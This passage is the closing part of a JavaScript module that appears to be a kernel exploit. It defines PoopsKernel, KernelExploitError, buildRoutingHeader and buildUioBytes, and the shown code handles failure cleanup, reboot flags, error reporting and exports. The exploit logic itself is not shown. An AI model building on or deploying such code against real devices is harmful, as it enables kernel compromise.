                this.attemptDiagnostics.cleanupWarnings
                    = cleanupWarnings.slice();
                this.attemptDiagnostics.preDirtyCleanupVerified
                    = this.preDirtyCleanupVerified;
                if (this.dirty || cleanupWarnings.length !== 0)
                    this.rebootRequired = true;
                const causeMessage = cause?.message || String(cause);
                const message = cleanupWarnings.length
                    ? `${causeMessage}; cleanup warnings: ${cleanupWarnings.join("; ")}`
                    : causeMessage;
                const failure = new KernelExploitError(
                    message, this.stage, cause);
                failure.cleanupWarnings = cleanupWarnings.slice();
                failure.rollbackVerified = this.preDirtyCleanupVerified;
                throw failure;
            }
        }
    }

    NS.KernelStage = STAGE;
    NS.KernelExploitError = KernelExploitError;
    NS.PoopsKernel = PoopsKernel;
    NS.buildRoutingHeader = buildRoutingHeader;
    NS.buildUioBytes = buildUioBytes;
    if (typeof module !== "undefined" && module.exports)
        module.exports = { PoopsKernel, KernelExploitError, KernelStage: STAGE,
            buildRoutingHeader, buildUioBytes };
})(typeof globalThis !== "undefined" ? globalThis : this);
